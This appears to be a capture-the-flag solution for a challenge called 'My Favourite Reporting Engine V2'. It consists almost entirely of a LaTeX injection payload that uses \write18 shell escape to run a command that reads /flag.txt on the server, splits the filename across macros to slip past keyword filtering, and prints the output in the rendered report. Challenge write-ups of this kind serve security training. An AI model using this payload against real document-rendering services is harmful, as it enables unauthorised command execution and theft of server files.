# My Favourite Reporting Engine V2

Challenge Author: yappare

## Solution

```
\documentclass{article}
\begin{document}

\def\wr{\write}
\def\fl{fl}
\def\ag{ag}
\def\txt{.txt}
\immediate\wr18{tac /\fl\ag\txt > /tmp/out.txt}

\newread\file
\openin\file=/tmp/out.txt
\loop
    \read\file to \line
    \ifeof\file
    \else
        \detokenize\expandafter{\line}%
        \par
    \fi
    \ifeof\file
    \else
        \repeat
\closein\file

\end{document}
```